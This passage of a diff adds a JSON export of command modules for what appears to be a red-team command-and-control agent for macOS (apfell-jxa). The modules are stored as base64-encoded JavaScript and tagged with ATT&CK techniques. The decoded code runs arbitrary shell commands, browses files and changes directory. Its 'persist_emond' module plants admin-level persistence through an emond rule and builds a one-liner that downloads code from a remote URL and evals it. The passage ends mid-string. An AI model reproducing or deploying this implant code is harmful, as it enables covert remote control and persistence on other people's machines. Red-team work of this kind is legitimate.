+              "shell.js": "ZXhwb3J0cy5zaGVsbCA9IGZ1bmN0aW9uKHRhc2ssIGNvbW1hbmQsIHBhcmFtcyl7CgkvL3NpbXBseSBydW4gYSBzaGVsbCBjb21tYW5kIHZpYSBkb1NoZWxsU2NyaXB0IGFuZCByZXR1cm4gdGhlIHJlc3BvbnNlCglsZXQgcmVzcG9uc2UgPSAiIjsKCXRyeXsKCQlsZXQgY29tbWFuZF9wYXJhbXMgPSBKU09OLnBhcnNlKHBhcmFtcyk7CgkJbGV0IGNvbW1hbmQgPSBjb21tYW5kX3BhcmFtc1snY29tbWFuZCddOwoJICAgIGlmKGNvbW1hbmRbY29tbWFuZC5sZW5ndGgtMV0gPT09ICImIil7CgkgICAgICAgIC8vZG9TaGVsbFNjcmlwdCBhY3R1YWxseSBkb2VzIG1hY09TJyAvYmluL3NoIHdoaWNoIGlzIGFjdHVhbGx5IGJhc2ggZW11bGF0aW5nIHNoCgkgICAgICAgIC8vICBzbyB0byBhY3R1YWxseSBiYWNrZ3JvdW5kIGEgdGFzaywgeW91IG5lZWQgIiY+IC9kZXYvbnVsbCAmIiBhdCB0aGUgZW5kCgkgICAgICAgIC8vICBzbyBJJ2xsIGp1c3QgYXV0b21hdGljYWxseSBmaXggdGhpcyBzbyBpdCdzIG5vdCB3ZWlyZCBmb3IgdGhlIG9wZXJhdG9yCgkgICAgICAgIGNvbW1hbmQgPSBjb21tYW5kICsgIj4gL2Rldi9udWxsICYiOwoJICAgIH0KCQlyZXNwb25zZSA9IGN1cnJlbnRBcHAuZG9TaGVsbFNjcmlwdChjb21tYW5kKTsKCQlpZihyZXNwb25zZSA9PT0gdW5kZWZpbmVkIHx8IHJlc3BvbnNlID09PSAiIil7CgkJICAgIHJlc3BvbnNlID0gIk5vIENvbW1hbmQgT3V0cHV0IjsKCQl9CgkJLy8gc2hlbGwgb3V0cHV0IHVzZXMgXHIgaW5zdGVhZCBvZiBcbiBvciBcclxuIHRvIGxpbmUgZW5kaW5ncywgZml4IHRoaXMgbm9uc2Vuc2UKCQlyZXNwb25zZSA9IHJlc3BvbnNlLnJlcGxhY2UoL1xyL2csICJcbiIpOwoJCXJldHVybiB7InVzZXJfb3V0cHV0IjpyZXNwb25zZSwgImNvbXBsZXRlZCI6IHRydWV9OwoJfQoJY2F0Y2goZXJyb3IpewoJCXJlc3BvbnNlID0gZXJyb3IudG9TdHJpbmcoKS5yZXBsYWNlKC9cci9nLCAiXG4iKTsKCQlyZXR1cm4geyJ1c2VyX291dHB1dCI6cmVzcG9uc2UsICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjogImVycm9yIn07Cgl9Cn07CkNPTU1BTkRfRU5EU19IRVJF"
+            }
+          ],
+          "transforms": [
+            {
+              "order": 1,
+              "parameter": "command",
+              "active": true,
+              "description": "",
+              "timestamp": "05\/07\/2020 07:01:49",
+              "command": "shell",
+              "command_id": 63,
+              "payload_type": "apfell-jxa",
+              "transform": "jsonSingleParameter",
+              "parameter_type": "String"
+            }
+          ]
+        },
+        {
+          "needs_admin": false,
+          "help_cmd": "ls \/path\/to\/file",
+          "version": 2,
+          "is_exit": false,
+          "is_file_browse": false,
+          "file_browse_parameters": "",
+          "is_process_list": false,
+          "process_list_parameters": "",
+          "is_download_file": false,
+          "download_file_parameters": "",
+          "is_remove_file": false,
+          "remove_file_parameters": "",
+          "is_agent_generator": false,
+          "author": "",
+          "deleted": false,
+          "description": "Get attributes about a file and display it to the user via API calls. No need for quotes and relative paths are fine",
+          "cmd": "ls",
+          "parameters": [
+            {
+              "type": "String",
+              "hint": "",
+              "choices": "",
+              "required": true,
+              "name": "path"
+            }
+          ],
+          "attack": [
+            {
+              "t_num": "T1106",
+              "attack_name": "Execution through API"
+            },
+            {
+              "t_num": "T1083",
+              "attack_name": "File and Directory Discovery"
+            }
+          ],
+          "artifacts": [],
+          "files": [
+            {
+              "ls.js": "ZXhwb3J0cy5scyA9IGZ1bmN0aW9uKHRhc2ssIGNvbW1hbmQsIHBhcmFtcyl7CiAgICBPYmpDLmltcG9ydCgnRm91bmRhdGlvbicpOwogICAgdHJ5IHsKICAgICAgICBsZXQgY29tbWFuZF9wYXJhbXMgPSBKU09OLnBhcnNlKHBhcmFtcyk7CiAgICAgICAgbGV0IGZpbGVNYW5hZ2VyID0gJC5OU0ZpbGVNYW5hZ2VyLmRlZmF1bHRNYW5hZ2VyOwogICAgICAgIGxldCBlcnJvciA9IFJlZigpOwogICAgICAgIGxldCBwYXRoID0gY29tbWFuZF9wYXJhbXNbJ3BhdGgnXTsKICAgICAgICBpZiAocGF0aCA9PT0gIiIgfHwgcGF0aCA9PT0gdW5kZWZpbmVkKSB7CiAgICAgICAgICAgIHBhdGggPSBmaWxlTWFuYWdlci5jdXJyZW50RGlyZWN0b3J5UGF0aC5qczsKICAgICAgICAgICAgaWYgKHBhdGggPT09IHVuZGVmaW5lZCB8fCBwYXRoID09PSAiIikgewogICAgICAgICAgICAgICAgcmV0dXJuIHsKICAgICAgICAgICAgICAgICAgICAidXNlcl9vdXRwdXQiOiAiRmFpbGVkIHRvIGdldCBjdXJyZW50IHdvcmtpbmcgZGlyZWN0b3J5IiwKICAgICAgICAgICAgICAgICAgICAiY29tcGxldGVkIjogdHJ1ZSwKICAgICAgICAgICAgICAgICAgICAic3RhdHVzIjogImVycm9yIgogICAgICAgICAgICAgICAgfTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZiAocGF0aFswXSA9PT0gJyInKSB7CiAgICAgICAgICAgIHBhdGggPSBwYXRoLnN1YnN0cmluZygxLCBwYXRoLmxlbmd0aCAtIDEpOwogICAgICAgIH0KICAgICAgICBpZihwYXRoWzBdID09PSAnficpewogICAgICAgICAgICBwYXRoID0gJChwYXRoKS5zdHJpbmdCeUV4cGFuZGluZ1RpbGRlSW5QYXRoLmpzOwogICAgICAgIH0KICAgICAgICBsZXQgYXR0cmlidXRlcyA9IE9iakMuZGVlcFVud3JhcChmaWxlTWFuYWdlci5hdHRyaWJ1dGVzT2ZJdGVtQXRQYXRoRXJyb3IoJChwYXRoKSwgZXJyb3IpKTsKICAgICAgICBpZiAoYXR0cmlidXRlcyAhPT0gdW5kZWZpbmVkKSB7CiAgICAgICAgICAgIGF0dHJpYnV0ZXNbJ3R5cGUnXSA9ICJGIjsKICAgICAgICAgICAgYXR0cmlidXRlc1snZmlsZXMnXSA9IFtdOwogICAgICAgICAgICBpZiAoYXR0cmlidXRlcy5oYXNPd25Qcm9wZXJ0eSgnTlNGaWxlVHlwZScpICYmIGF0dHJpYnV0ZXNbJ05TRmlsZVR5cGUnXSA9PT0gIk5TRmlsZVR5cGVEaXJlY3RvcnkiKSB7CiAgICAgICAgICAgICAgICBsZXQgZXJyb3IgPSBSZWYoKTsKICAgICAgICAgICAgICAgIGF0dHJpYnV0ZXNbJ3R5cGUnXSA9ICJEIjsKICAgICAgICAgICAgICAgIGxldCBmaWxlcyA9IE9iakMuZGVlcFVud3JhcChmaWxlTWFuYWdlci5jb250ZW50c09mRGlyZWN0b3J5QXRQYXRoRXJyb3IoJChwYXRoKSwgZXJyb3IpKTsKICAgICAgICAgICAgICAgIGlmIChmaWxlcyAhPT0gdW5kZWZpbmVkKSB7CiAgICAgICAgICAgICAgICAgICAgbGV0IGZpbGVzX2RhdGEgPSBbXTsKICAgICAgICAgICAgICAgICAgICBsZXQgc3ViX2ZpbGVzID0gZmlsZXM7CiAgICAgICAgICAgICAgICAgICAgaWYgKHBhdGhbcGF0aC5sZW5ndGggLSAxXSAhPT0gIi8iKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHBhdGggPSBwYXRoICsgIi8iOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IHN1Yl9maWxlcy5sZW5ndGg7IGkrKykgewogICAgICAgICAgICAgICAgICAgICAgICBsZXQgYXR0ciA9IE9iakMuZGVlcFVud3JhcChmaWxlTWFuYWdlci5hdHRyaWJ1dGVzT2ZJdGVtQXRQYXRoRXJyb3IoJChwYXRoICsgc3ViX2ZpbGVzW2ldKSwgZXJyb3IpKTsKICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGZpbGVfYWRkID0ge307CiAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfYWRkWyduYW1lJ10gPSBzdWJfZmlsZXNbaV07CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChhdHRyWydOU0ZpbGVUeXBlJ10gPT09ICJOU0ZpbGVUeXBlRGlyZWN0b3J5IikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9hZGRbJ3R5cGUnXSA9ICJEIjsKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfYWRkWyd0eXBlJ10gPSAiIjsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBsZXQgcGxpc3RQZXJtcyA9IE9iakMudW53cmFwKGZpbGVNYW5hZ2VyLmF0dHJpYnV0ZXNPZkl0ZW1BdFBhdGhFcnJvcigkKHBhdGggKyBzdWJfZmlsZXNbaV0pLCAkKCkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgaWYocGxpc3RQZXJtc1snTlNGaWxlRXh0ZW5kZWRBdHRyaWJ1dGVzJ10gIT09IHVuZGVmaW5lZCl7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgZXh0ZW5kZWQgPSB7fTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBwZXJtcyA9IHBsaXN0UGVybXNbJ05TRmlsZUV4dGVuZGVkQXR0cmlidXRlcyddLmpzOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yKGxldCBqIGluIHBlcm1zKXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleHRlbmRlZFtqXSA9IHBlcm1zW2pdLmJhc2U2NEVuY29kZWRTdHJpbmdXaXRoT3B0aW9ucygwKS5qczsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfYWRkWydFeHRlbmRlZEF0dHJpYnV0ZXMnXSA9IGV4dGVuZGVkOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfYWRkWydzaXplJ10gPSBhdHRyWydOU0ZpbGVTaXplJ107CiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBuc3Bvc2l4ID0gYXR0clsnTlNGaWxlUG9zaXhQZXJtaXNzaW9ucyddOwogICAgICAgICAgICAgICAgICAgICAgICAvLyB3ZSBuZWVkIHRvIGZpeCB0aGlzIG1lc3MgdG8gYWN0dWFsbHkgYmUgcmVhbCBwZXJtaXNzaW9uIGJpdHMgdGhhdCBtYWtlIHNlbnNlCiAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfYWRkWydwZXJtaXNzaW9ucyddID0gKChuc3Bvc2l4ID4+IDYpICYgMHg3KS50b1N0cmluZygpICsgKChuc3Bvc2l4ID4+IDMpICYgMHg3KS50b1N0cmluZygpICsgKG5zcG9zaXggJiAweDcpLnRvU3RyaW5nKCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfYWRkWydvd25lciddID0gYXR0clsnTlNGaWxlT3duZXJBY2NvdW50TmFtZSddICsgIigiICsgYXR0clsnTlNGaWxlT3duZXJBY2NvdW50SUQnXSArICIpIjsKICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9hZGRbJ2dyb3VwJ10gPSBhdHRyWydOU0ZpbGVHcm91cE93bmVyQWNjb3VudE5hbWUnXSArICIoIiArIGF0dHJbJ05TRmlsZUdyb3VwT3duZXJBY2NvdW50SUQnXSArICIpIjsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGF0dHJbJ05TRmlsZUV4dGVuc2lvbkhpZGRlbiddKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX2FkZFsnaGlkZGVuJ10gPSAiWSI7CiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX2FkZFsnaGlkZGVuJ10gPSAiIjsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBmaWxlc19kYXRhLnB1c2goZmlsZV9hZGQpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBhdHRyaWJ1dGVzWydmaWxlcyddID0gZmlsZXNfZGF0YTsKICAgICAgICAgICAgICAgIH1lbHNlewoKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBkZWxldGUgYXR0cmlidXRlc1snTlNGaWxlU3lzdGVtRmlsZU51bWJlciddOwogICAgICAgICAgICBkZWxldGUgYXR0cmlidXRlc1snTlNGaWxlU3lzdGVtTnVtYmVyJ107CiAgICAgICAgICAgIGRlbGV0ZSBhdHRyaWJ1dGVzWydOU0ZpbGVUeXBlJ107CiAgICAgICAgICAgIGxldCBuc3Bvc2l4ID0gYXR0cmlidXRlc1snTlNGaWxlUG9zaXhQZXJtaXNzaW9ucyddOwogICAgICAgICAgICAvLyB3ZSBuZWVkIHRvIGZpeCB0aGlzIG1lc3MgdG8gYWN0dWFsbHkgYmUgcmVhbCBwZXJtaXNzaW9uIGJpdHMgdGhhdCBtYWtlIHNlbnNlCiAgICAgICAgICAgIGRlbGV0ZSBhdHRyaWJ1dGVzWydOU0ZpbGVQb3NpeFBlcm1pc3Npb25zJ107CiAgICAgICAgICAgIGF0dHJpYnV0ZXNbJ25hbWUnXSA9IHBhdGg7CiAgICAgICAgICAgIGF0dHJpYnV0ZXNbJ3NpemUnXSA9IGF0dHJpYnV0ZXNbJ05TRmlsZVNpemUnXTsKICAgICAgICAgICAgYXR0cmlidXRlc1sncGVybWlzc2lvbnMnXSA9ICgobnNwb3NpeCA+PiA2KSAmIDB4NykudG9TdHJpbmcoKSArICgobnNwb3NpeCA+PiAzKSAmIDB4NykudG9TdHJpbmcoKSArIChuc3Bvc2l4ICYgMHg3KS50b1N0cmluZygpOzsKICAgICAgICAgICAgYXR0cmlidXRlc1snb3duZXInXSA9IGF0dHJpYnV0ZXNbJ05TRmlsZU93bmVyQWNjb3VudE5hbWUnXSArICIoIiArIGF0dHJpYnV0ZXNbJ05TRmlsZU93bmVyQWNjb3VudElEJ10gKyAiKSI7CiAgICAgICAgICAgIGF0dHJpYnV0ZXNbJ2dyb3VwJ10gPSBhdHRyaWJ1dGVzWydOU0ZpbGVHcm91cE93bmVyQWNjb3VudE5hbWUnXSArICIoIiArIGF0dHJpYnV0ZXNbJ05TRmlsZUdyb3VwT3duZXJBY2NvdW50SUQnXSArICIpIjsKICAgICAgICAgICAgaWYgKGF0dHJpYnV0ZXNbJ05TRmlsZUV4dGVuc2lvbkhpZGRlbiddKSB7CiAgICAgICAgICAgICAgICBhdHRyaWJ1dGVzWydoaWRkZW4nXSA9ICJZIjsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGF0dHJpYnV0ZXNbJ2hpZGRlbiddID0gIiI7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZGVsZXRlIGF0dHJpYnV0ZXNbJ05TRmlsZVNpemUnXTsKICAgICAgICAgICAgZGVsZXRlIGF0dHJpYnV0ZXNbJ05TRmlsZU93bmVyQWNjb3VudE5hbWUnXTsKICAgICAgICAgICAgZGVsZXRlIGF0dHJpYnV0ZXNbJ05TRmlsZU93bmVyQWNjb3VudElEJ107CiAgICAgICAgICAgIGRlbGV0ZSBhdHRyaWJ1dGVzWydOU0ZpbGVHcm91cE93bmVyQWNjb3VudE5hbWUnXTsKICAgICAgICAgICAgZGVsZXRlIGF0dHJpYnV0ZXNbJ05TRmlsZUdyb3VwT3duZXJBY2NvdW50SUQnXTsKICAgICAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiBKU09OLnN0cmluZ2lmeShhdHRyaWJ1dGVzLCBudWxsLCA2KSwgImNvbXBsZXRlZCI6IHRydWV9OwogICAgICAgIH1lbHNlewogICAgICAgICAgICByZXR1cm4gewogICAgICAgICAgICAgICAgInVzZXJfb3V0cHV0IjogIkZhaWxlZCB0byBnZXQgYXR0cmlidXRlcyBvZiBmaWxlLiBGaWxlIGRvZXNuJ3QgZXhpc3Qgb3IgeW91IGRvbid0IGhhdmUgcGVybWlzc2lvbiB0byByZWFkIGl0IiwKICAgICAgICAgICAgICAgICJjb21wbGV0ZWQiOiB0cnVlLAogICAgICAgICAgICAgICAgInN0YXR1cyI6ICJlcnJvciIKICAgICAgICAgICAgfTsKICAgICAgICB9CgogICAgfWNhdGNoKGVycm9yKXsKICAgICAgICByZXR1cm4gewogICAgICAgICAgICAidXNlcl9vdXRwdXQiOiAiRXJyb3I6ICIgKyBlcnJvci50b1N0cmluZygpLAogICAgICAgICAgICAiY29tcGxldGVkIjogdHJ1ZSwKICAgICAgICAgICAgInN0YXR1cyI6ICJlcnJvciIKICAgICAgICB9OwogICAgfQp9OwpDT01NQU5EX0VORFNfSEVSRQ=="
+            }
+          ],
+          "transforms": [
+            {
+              "order": 1,
+              "parameter": "path",
+              "active": true,
+              "description": "",
+              "timestamp": "05\/07\/2020 07:01:49",
+              "command": "ls",
+              "command_id": 36,
+              "payload_type": "apfell-jxa",
+              "transform": "jsonSingleParameter",
+              "parameter_type": "String"
+            }
+          ],
+          "browser_script": "ZnVuY3Rpb24odGFzaywgcmVzcG9uc2VzKXsKCWlmKHRhc2suc3RhdHVzID09PSAnZXJyb3InKXsKCQlyZXR1cm4gIjxwcmU+IEVycm9yOiB1bnRvZ2dsZSBmb3IgZXJyb3IgbWVzc2FnZShzKSA8L3ByZT4iOwoJfQogIGxldCByb3dzID0gW107CiAgdHJ5ewogIAlmb3IobGV0IGkgPSAwOyBpIDwgcmVzcG9uc2VzLmxlbmd0aDsgaSsrKXsKICAgICAgICBsZXQgZGF0YSA9IEpTT04ucGFyc2UocmVzcG9uc2VzW2ldWydyZXNwb25zZSddKTsKICAgICAgICBsZXQgcm93X3N0eWxlID0gIiI7CgkJbGV0IGNlbGxfc3R5bGUgPSB7ImhpZGRlbiI6ICJ0ZXh0LWFsaWduOmNlbnRlciIsICJ0eXBlIjoidGV4dC1hbGlnbjpjZW50ZXIifTsKCSAgICByb3dzLnB1c2goeyJuYW1lIjogZGF0YVsnbmFtZSddLAogICAgICAgICAgICAgICAgICAgInNpemUiOiBkYXRhWydzaXplJ10sCiAgICAgICAgICAgICAgICAgICAicGVybWlzc2lvbnMiOiBkYXRhWydwZXJtaXNzaW9ucyddLAogICAgICAgICAgICAgICAgICAgIm93bmVyIjogZGF0YVsnb3duZXInXSwKICAgICAgICAgICAgICAgICAgICJncm91cCI6IGRhdGFbJ2dyb3VwJ10sCiAgICAgICAgICAgICAgICAgICAidHlwZSI6IGRhdGFbJ3R5cGUnXSwKICAgICAgICAgICAgICAgICAgICJ4YXR0ciI6ICIiLAogICAgICAgICAgICAgICAgICAgInJvdy1zdHlsZSI6IHJvd19zdHlsZSwKICAgICAgICAgICAgICAgICAgICJjZWxsLXN0eWxlIjogY2VsbF9zdHlsZQogICAgICAgIH0pOwoJICAgIGlmKCFkYXRhLmhhc093blByb3BlcnR5KCdmaWxlcycpKXtkYXRhWydmaWxlcyddID0gW119OwoJICAgIGRhdGFbJ2ZpbGVzJ10uZm9yRWFjaChmdW5jdGlvbihyKXsKICAgIAkJbGV0IHJvd19zdHlsZSA9ICIiOwogICAgCQkvL2lmKHJbJ25hbWUnXS5pbmNsdWRlcygiLnNoIikpe3Jvd19zdHlsZT0iYmFja2dyb3VuZC1jb2xvcjpyZWQ7Y29sb3I6d2hpdGUifQogICAgCQlpZihyLmhhc093blByb3BlcnR5KCdFeHRlbmRlZEF0dHJpYnV0ZXMnKSl7CiAgICAJCQlyWyd4YXR0ciddID0gT2JqZWN0LmtleXMoclsnRXh0ZW5kZWRBdHRyaWJ1dGVzJ10pLmpvaW4oIjxicj4iKTsKICAgIAkJfWVsc2V7CiAgICAJCQlyWyd4YXR0ciddID0gIiI7CiAgICAJCX0KCQkgICAgcm93cy5wdXNoKHsibmFtZSI6IHJbJ25hbWUnXSwKCSAgICAgICAgICAgICAgICAgICAic2l6ZSI6IHJbJ3NpemUnXSwKCSAgICAgICAgICAgICAgICAgICAicGVybWlzc2lvbnMiOiByWydwZXJtaXNzaW9ucyddLAoJICAgICAgICAgICAgICAgICAgICJvd25lciI6IHJbJ293bmVyJ10sCgkgICAgICAgICAgICAgICAgICAgImdyb3VwIjogclsnZ3JvdXAnXSwKCSAgICAgICAgICAgICAgICAgICAidHlwZSI6IHJbJ3R5cGUnXSwKCSAgICAgICAgICAgICAgICAgICAieGF0dHIiOiByWyd4YXR0ciddLAoJICAgICAgICAgICAgICAgICAgICJyb3ctc3R5bGUiOiByb3dfc3R5bGUsCgkgICAgICAgICAgICAgICAgICAgImNlbGwtc3R5bGUiOiB7ImhpZGRlbiI6ICJ0ZXh0LWFsaWduOmNlbnRlciIsICJ0eXBlIjoidGV4dC1hbGlnbjpjZW50ZXIifQogICAgICAgICAgIH0pOwoJCX0pOwoJfQogICAgCXZhciBvdXRwdXQgPSBzdXBwb3J0X3NjcmlwdHNbJ2NyZWF0ZV90YWJsZSddKFt7Im5hbWUiOiJuYW1lIiwgInNpemUiOiIxMGVtIn0seyJuYW1lIjoic2l6ZSIsICJzaXplIjoiMmVtIn0sIHsibmFtZSI6InBlcm1pc3Npb25zIiwgInNpemUiOiIyZW0ifSx7Im5hbWUiOiJvd25lciIsInNpemUiOiIzZW0ifSAseyJuYW1lIjogImdyb3VwIiwgInNpemUiOiAiMmVtIn0gLHsibmFtZSI6InR5cGUiLCAic2l6ZSI6ICIxZW0ifSwgeyJuYW1lIjoieGF0dHIiLCAic2l6ZSI6ICIxZW0ifV0sIHJvd3MpOwogICAgCXJldHVybiBvdXRwdXQ7CiAgICB9Y2F0Y2goZXJyb3IpewogICAgICAgIHJldHVybiAiPHByZT4iICsgSlNPTi5zdHJpbmdpZnkocmVzcG9uc2VzWzBdWydyZXNwb25zZSddLCBudWxsLCAyKSArICI8L3ByZT4iOwogICAgfQp9"
+        },
+        {
+          "needs_admin": false,
+          "help_cmd": "cd [path]",
+          "version": 2,
+          "is_exit": false,
+          "is_file_browse": false,
+          "file_browse_parameters": "",
+          "is_process_list": false,
+          "process_list_parameters": "",
+          "is_download_file": false,
+          "download_file_parameters": "",
+          "is_remove_file": false,
+          "remove_file_parameters": "",
+          "is_agent_generator": false,
+          "author": "",
+          "deleted": false,
+          "description": "Change the current working directory to another directory. No quotes are necessary and relative paths are fine",
+          "cmd": "cd",
+          "parameters": [
+            {
+              "type": "String",
+              "hint": "path to change directory to",
+              "choices": "",
+              "required": true,
+              "name": "path"
+            }
+          ],
+          "attack": [
+            {
+              "t_num": "T1083",
+              "attack_name": "File and Directory Discovery"
+            }
+          ],
+          "artifacts": [],
+          "files": [
+            {
+              "cd.js": "ZXhwb3J0cy5jZCA9IGZ1bmN0aW9uKHRhc2ssIGNvbW1hbmQsIHBhcmFtcyl7CiAgICB0cnl7CiAgICAgICAgbGV0IGNvbW1hbmRfcGFyYW1zID0gSlNPTi5wYXJzZShwYXJhbXMpOwogICAgICAgIGlmKCFjb21tYW5kX3BhcmFtcy5oYXNPd25Qcm9wZXJ0eSgncGF0aCcpKXtyZXR1cm4geyJ1c2VyX291dHB1dCI6ICJNaXNzaW5nIHBhdGggcGFyYW1ldGVyIiwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifX0KICAgICAgICBsZXQgZmlsZU1hbmFnZXIgPSAkLk5TRmlsZU1hbmFnZXIuZGVmYXVsdE1hbmFnZXI7CiAgICAgICAgbGV0IHN1Y2Nlc3MgPSBmaWxlTWFuYWdlci5jaGFuZ2VDdXJyZW50RGlyZWN0b3J5UGF0aChjb21tYW5kX3BhcmFtc1sncGF0aCddKTsKICAgICAgICBpZihzdWNjZXNzKXsKICAgICAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiAiTmV3IGN3ZDogIiArIGZpbGVNYW5hZ2VyLmN1cnJlbnREaXJlY3RvcnlQYXRoLmpzLCAiY29tcGxldGVkIjogdHJ1ZX07CiAgICAgICAgfWVsc2V7CiAgICAgICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjogIkZhaWxlZCB0byBjaGFuZ2UgZGlyZWN0b3J5IiwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKICAgICAgICB9CiAgICB9Y2F0Y2goZXJyb3IpewogICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjogZXJyb3IudG9TdHJpbmcoKSwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKICAgIH0KfTsKQ09NTUFORF9FTkRTX0hFUkU="
+            }
+          ],
+          "transforms": [
+            {
+              "order": 1,
+              "parameter": "path",
+              "active": true,
+              "description": "",
+              "timestamp": "05\/07\/2020 07:01:49",
+              "command": "cd",
+              "command_id": 37,
+              "payload_type": "apfell-jxa",
+              "transform": "jsonSingleParameter",
+              "parameter_type": "String"
+            }
+          ]
+        },
+        {
+          "needs_admin": true,
+          "help_cmd": "persist_emond",
+          "version": 1,
+          "is_exit": false,
+          "is_file_browse": false,
+          "file_browse_parameters": "",
+          "is_process_list": false,
+          "process_list_parameters": "",
+          "is_download_file": false,
+          "download_file_parameters": "",
+          "is_remove_file": false,
+          "remove_file_parameters": "",
+          "is_agent_generator": false,
+          "author": "",
+          "deleted": false,
+          "description": "Create persistence with an emond plist file in \/etc\/emond.d\/rules\/ and a .DS_Store file to trigger it",
+          "cmd": "persist_emond",
+          "parameters": [
+            {
+              "type": "String",
+              "hint": "Rule name for inside of the plist",
+              "choices": "",
+              "required": true,
+              "name": "rule_name"
+            },
+            {
+              "type": "Choice",
+              "hint": "",
+              "choices": "oneliner-jxa\ncustom_bash-c",
+              "required": true,
+              "name": "payload_type"
+            },
+            {
+              "type": "String",
+              "hint": "url of payload for oneliner-jxa",
+              "choices": "",
+              "required": false,
+              "name": "url"
+            },
+            {
+              "type": "String",
+              "hint": "Command if type is custom_bash-c",
+              "choices": "",
+              "required": false,
+              "name": "command"
+            },
+            {
+              "type": "String",
+              "hint": "Name of plist in \/etc\/emond.d\/rules\/",
+              "choices": "",
+              "required": true,
+              "name": "file_name"
+            }
+          ],
+          "attack": [
+            {
+              "t_num": "T1150",
+              "attack_name": "Plist Modification"
+            }
+          ],
+          "artifacts": [],
+          "files": [
+            {
+              "persist_emond.js": "ZXhwb3J0cy5wZXJzaXN0X2Vtb25kID0gZnVuY3Rpb24odGFzaywgY29tbWFuZCwgcGFyYW1zKXsKICAgIHRyeXsKICAgICAgICAvL2Vtb25kIHBlcnNpc3RlbmNlIGZyb20gaHR0cHM6Ly93d3cueG9ycmlvci5jb20vZW1vbmQtcGVyc2lzdGVuY2UvCiAgICAgICAgbGV0IGNvbmZpZyA9IEpTT04ucGFyc2UocGFyYW1zKTsKICAgICAgICAvLyByZWFkICIvU3lzdGVtL0xpYnJhcnkvTGF1bmNoRGFlbW9ucy9jb20uYXBwbGUuZW1vbmQucGxpc3QiIGZvciB0aGUgIlF1ZXVlRGlyZWN0b3JpZXMiIGtleSAocmV0dXJucyBhcnJheSkKICAgICAgICAvLyBjcmVhdGUgIi5EU19TdG9yZSIgZmlsZSB0aGVyZSB0aGF0J3MgZW1wdHkKICAgICAgICAvLyBjcmVhdGUgbmV3IHBsaXN0IGluICIvZXRjL2Vtb25kLmQvcnVsZXMvIgogICAgICAgIGxldCBydWxlX25hbWUgPSAidXBkYXRlX2ZpbGVzIjsKICAgICAgICBpZihjb25maWcuaGFzT3duUHJvcGVydHkoJ3J1bGVfbmFtZScpICYmIGNvbmZpZ1sncnVsZV9uYW1lJ10gIT09ICIiKXtydWxlX25hbWUgPSBjb25maWdbJ3J1bGVfbmFtZSddO30KICAgICAgICBsZXQgcGF5bG9hZF90eXBlID0gIm9uZWxpbmVyLWp4YSI7CiAgICAgICAgaWYoY29uZmlnLmhhc093blByb3BlcnR5KCdwYXlsb2FkX3R5cGUnKSAmJiBjb25maWdbJ3BheWxvYWRfdHlwZSddICE9PSAiIil7cGF5bG9hZF90eXBlID0gY29uZmlnWydwYXlsb2FkX3R5cGUnXTt9CiAgICAgICAgaWYocGF5bG9hZF90eXBlID09PSAib25lbGluZXItanhhIil7CiAgICAgICAgICAgIGlmKGNvbmZpZy5oYXNPd25Qcm9wZXJ0eSgndXJsJykgJiYgY29uZmlnWyd1cmwnXSAhPT0gIiIpe3ZhciB1cmwgPSBjb25maWdbJ3VybCddO30KICAgICAgICAgICAgZWxzZXsgcmV0dXJuICJVUkwgaXMgcmVxdWlyZWQgZm9yIHRoZSBvbmVsaW5lci1qeGEgcGF5bG9hZF90eXBlIjsgfQogICAgICAgICAgICB2YXIgY29tbWFuZCA9ICJldmFsKE9iakMudW53cmFwKCQuTlNTdHJpbmcuYWxsb2MuaW5pdFdpdGhEYXRhRW5jb2RpbmcoJC5OU0RhdGEuZGF0YVdpdGhDb250ZW50c09mVVJMKCQuTlNVUkwuVVJMV2l0aFN0cmluZygnIiArCiAgICAgICAgICAgIHVybCArICInKSksJC5OU1VURjhTdHJpbmdFbmNvZGluZykpKSI7CiAgICAgICAgICAgIC8vIG5vdyB3ZSBuZWVkIHRvIGJhc2U2NCBlbmNvZGUgb3VyIGNvbW1hbmQKICAgICAgICAgICAgdmFyI